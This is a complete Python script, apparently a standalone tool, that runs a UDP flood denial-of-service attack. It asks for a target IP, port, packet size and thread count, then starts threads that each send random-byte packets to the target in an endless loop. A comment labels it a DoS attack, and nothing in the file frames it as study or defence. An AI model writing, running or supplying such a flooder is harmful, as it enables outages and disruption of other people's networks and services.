try:
    import threading
    import socket
    import random
    import sys

except ImportError as e:
    print(f"ERROR: {e}")
    sys.exit()

# Function to launch DoS attack
# NOTE: only way to exit is by closing the cmd window
def DoS(ip, port, size, index):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(random._urandom(size), (ip, port))
        print(
            f"THREAD: {index}, SIZE: {size} bytes sent to - {ip}")


def main():
    try:
        # takes args from command line if none are entered at compilation
        IP = input("Enter the target ip: ") if len(
            sys.argv) < 2 else sys.argv[1]
        PORT = int(input("Enter the target port (1->65535): ")) if len(
            sys.argv) < 3 else int(sys.argv[2])
        SIZE = int(input("Enter the packet size (1->65500): ")) if len(
            sys.argv) < 4 else int(sys.argv[3])
        COUNT = int(input("Enter how many threads to use: ")) if len(
            sys.argv) < 5 else int(sys.argv[4])

        # Error Handling of input
        if PORT > 65535 or PORT < 1:
            print(
                "\nERROR: Please, choose a port between 1 and 65535")
            sys.exit(1)

        if SIZE > 65500 or SIZE < 1:
            print(
                "\nERROR: Please, choose a size between 1 and 65500")
            sys.exit(1)

    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit()

    except Exception as e:
        print(f"\nERROR: {e}")
        sys.exit()

    for i in range(COUNT):
        try:
            t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
            t.start()
        except Exception as e:
            print(
                f"\nERROR: An error ocurred initializing thread {i}: {e}")


if __name__ == "__main__":
    main()
